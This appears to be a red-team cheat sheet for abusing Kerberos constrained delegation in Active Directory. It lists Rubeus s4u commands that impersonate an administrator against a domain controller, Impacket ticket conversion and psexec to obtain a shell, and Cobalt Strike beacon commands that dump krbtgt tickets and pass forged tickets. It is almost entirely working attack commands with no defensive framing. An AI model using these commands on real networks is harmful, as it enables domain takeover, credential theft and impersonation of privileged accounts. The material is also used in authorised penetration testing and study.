### Constrained Delegation

```
Rubeus.exe s4u /user:John-activebreach.io /rc4: /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /domain:activebreach.io /dc:10.10.10.10 /ptt
Rubeus.exe s4u /user:John-activebreach.io$ /rc4: /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /domain:activebreach.io /dc:10.10.10.10 /ptt
Rubeus.exe s4u /user:John-activebreach.io$ /rc4: /impersonateuser:administrator /msdsspn:host/DC01.Activebreach.io /domain:activebreach.io /dc:10.10.10.10 /ptt
```

### From Linux to Gain Shell
```
impacket-ticketConverter cif_cifs_John-activebreach.io.kirbi admin.ccache
export KRB5CCNAME=admin.ccache
proxychains impacket-psexec -k -no-pass -target-ip 10.10.10.110 -dc-ip 10.10.10.10 John-activebreach.io
```

### From From Beacon (Cobalt Strike)
```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt 
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:John_PC$ /msdsspn:cifs/fs-1.insomnia.io /ticket:
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:MeMe /msdsspn:cifs/fs-1.insomnia.io /altservice:cifs /ticket:
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
```
